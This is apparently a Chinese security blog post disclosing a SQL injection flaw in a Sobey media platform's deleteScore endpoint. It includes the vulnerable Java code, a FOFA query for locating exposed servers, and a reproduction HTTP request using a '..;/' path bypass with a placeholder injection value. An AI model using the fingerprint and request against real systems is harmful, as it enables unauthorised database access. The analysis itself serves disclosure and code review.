---
title: "索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/deleteScore SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-jztEditorScore-deleteScore-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchjzteditorscoredeletescore-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/deleteScore SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/17 08:11
- 548浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

代码安全审计

网络安全培训

网络安全课程

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/jztEditorScore/deleteScore 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/jztEditorScore/deleteScore`的实现逻辑

```
@RequestMapping(
    value = {"/deleteScore"},
    method = {RequestMethod.POST}
)
public Response deleteScore(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("ids") String ids) {
    if (StringUtils.isNotEmpty(ids)) {
        String[] idArray = ids.split(",");
        StringBuffer deleteBuffer = new StringBuffer("delete from  zcncommoneditorscore where 1= 1 ");
        SchemaSQLUtil.appendInCondition(deleteBuffer, "id", Arrays.asList(idArray));
        (new QueryBuilder(deleteBuffer.toString())).executeNoQuery();
    }

    return Response.successMsg(this.enTips("delete.success", "删除成功。"));
}
```

深入探索

文件大小转换

Docker加速服务

云安全解决方案

参数ids使用逗号分割成数组后带入appendInCondition跟进

代码安全审计

```
public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values) {
    appendInCondition(sqlbuffer, colomnName, values, false);
}

public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values, boolean or) {
    if (!or) {
        sqlbuffer.append(String.format(" and %s in (", colomnName));
    } else {
        sqlbuffer.append(String.format(" or %s in (", colomnName));
    }

    int num = values.size();

    for(T value : values) {
        sqlbuffer.append(String.format(" '%s' ", value.toString()));
        --num;
        if (num > 0) {
            sqlbuffer.append(",");
        }
    }

    sqlbuffer.append(") ");
}
```

深入探索

传输层安全性协议

SQL注入防护

安全运维咨询

代码一看就很明了了，**ids**是无任何过滤或校验处理，被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /sobey-mchEditor/js/..;/mch/jztEditorScore/deleteScore HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

channelId=1&ids='SQLI_POC&isRenYuan=1&siteCode=&token=&userCode=admin
```

[![索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/deleteScore SQL注入漏洞](images/img-001-953a3625a4fc.webp)](https://image.mrxn.net/c8e1690a44a64bc5baf04b7ae1511198.webp)

成功延时 5 秒

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
